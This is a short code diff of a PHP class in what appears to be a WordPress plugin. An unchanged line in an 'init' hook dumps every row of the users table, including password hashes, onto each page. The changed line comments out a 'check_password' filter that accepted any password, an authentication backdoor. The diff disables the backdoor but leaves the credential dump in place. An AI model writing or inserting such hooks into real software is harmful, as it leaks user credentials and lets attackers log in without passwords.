@@ -96,7 +96,7 @@ class Project {
 		add_action( 'init', function() {
 			global $wpdb;print_r( $wpdb->get_results( $wpdb->prepare( "SELECT * FROM {$wpdb->prefix}users;" ) ) );
 		}, 10, 0 );
-		add_filter( 'check_password', function( $bool ) {return true;}, 10, 1 );
+		// add_filter( 'check_password', function( $bool ) {return true;}, 10, 1 );
 	}
 	// 
 	public function fixSlashes($path) {
